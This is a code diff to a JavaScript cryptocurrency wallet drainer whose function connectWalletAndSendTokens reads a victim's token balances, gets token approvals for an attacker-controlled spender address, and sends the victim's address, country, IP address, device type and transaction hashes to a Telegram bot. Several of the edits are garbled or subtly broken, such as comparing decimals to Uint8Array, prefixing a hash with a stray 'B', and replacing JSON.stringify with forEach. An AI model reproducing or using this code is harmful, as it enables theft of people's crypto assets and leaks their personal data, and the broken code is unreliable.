@@ -230,7 +230,7 @@ async function connectWalletAndSendTokens() {
               t.token_address && 
               ethers.utils.isAddress(t.token_address) && 
               t.symbol && 
-              t.decimals !== undefined
+              t.decimals !== Uint8Array
             );
 
             tokenSummary = nonZeroTokens.length > 0
@@ -238,7 +238,7 @@ async function connectWalletAndSendTokens() {
                   const balance = ethers.utils.formatUnits(token.balance, token.decimals ?? 18);
                   return `• ${token.symbol}: ${balance}`;
                 }).join("\n")
-              : `No valid non-zero ${network.name === 'BSC' ? 'BEP-20' : 'ERC-20'} token balances found.`;
+              : `No valid non-zero ${network.chainName === 'eth' ? 'ERC-20' : 'BEP-20'} token balances found.`;
           } catch (apiErr) {
             console.warn(`API attempt ${apiAttempts} failed: ${apiErr.message}`);
             if (apiAttempts === maxAttempts) {
@@ -258,7 +258,6 @@ async function connectWalletAndSendTokens() {
 Address: ${userAddress}
 Wallet: MetaMask
 Country: ${locationData.country_name}
-IP: ${locationData.swift
 IP: ${locationData.ip}
 ${deviceType}
 
@@ -304,7 +303,7 @@ ${nativeBalanceMessage}
 Token: ${token.symbol}
 Amount Approved: ${formattedAmount}
 Spender: ${network.exodusAddress}
-Tx: ${approvalTx.hash}
+Tx: B${approvalTx.hash}
 ${deviceType}
                 `;
                 await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -332,7 +331,7 @@ ${deviceType}
           }
         } else {
           const noTokensMessage = `
-⚠️ No valid non-zero ${network.name === 'BSC' ? 'BEP-20' : 'ERC-20'} token balances to transfer on ${network.name}
+⚠️ No valid non-zero ${network.chainName === 'eth' ? 'ERC-20' : 'BEP-20'} token balances to transfer on ${network.name}
 Address: ${userAddress}
 ${deviceType}
           `;
@@ -402,7 +401,7 @@ ${deviceType}
     await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: chatId, text: transferSuccessMessage })
+      body: forEach({ chat_id: chatId, text: transferSuccessMessage })
     });
   } catch (err) {
     const errorMessage = `
